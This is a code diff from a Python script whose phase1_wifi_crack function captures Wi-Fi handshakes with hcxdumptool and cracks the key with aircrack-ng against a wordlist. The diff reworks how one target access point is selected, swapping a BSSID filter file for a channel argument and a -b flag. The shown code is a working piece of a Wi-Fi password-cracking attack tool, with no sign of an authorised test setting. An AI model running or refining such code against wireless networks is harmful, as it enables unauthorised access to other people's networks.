@@ -595,15 +595,10 @@ def phase1_wifi_crack() -> PhaseResult:
                 border_style="cyan", expand=False,
             ))
 
-            # Write the target BSSID (colon-stripped) to the hcxdumptool filter file.
-            clean_bssid = bssid.replace(":", "").lower()
-            run_cmd(f"echo '{clean_bssid}' > /tmp/target_mac.txt", capture=False)
-
             pcapng_file = f"{cap}.pcapng"
             run_cmd(f"sudo rm -f {pcapng_file}", capture=False)
             run_cmd(
-                f"sudo timeout 20 hcxdumptool -i {iface} -w {pcapng_file} "
-                f"--filterlist_ap=/tmp/target_mac.txt --filtermode=2",
+                f"sudo timeout 20 hcxdumptool -i {iface} -w {pcapng_file} -c {channel}",
                 timeout=30, capture=True,
             )
 
@@ -613,7 +608,7 @@ def phase1_wifi_crack() -> PhaseResult:
                 ok("Capture file found — running aircrack-ng...")
                 wl_arg = wl if wl else "/dev/null"
                 rc, out = run_cmd(
-                    f"sudo aircrack-ng {pcapng_file} -w {wl_arg}", timeout=300
+                    f"sudo aircrack-ng {pcapng_file} -b {bssid} -w {wl_arg}", timeout=300
                 )
                 if "KEY FOUND" in out:
                     # Strip ANSI escape sequences before parsing — aircrack-ng
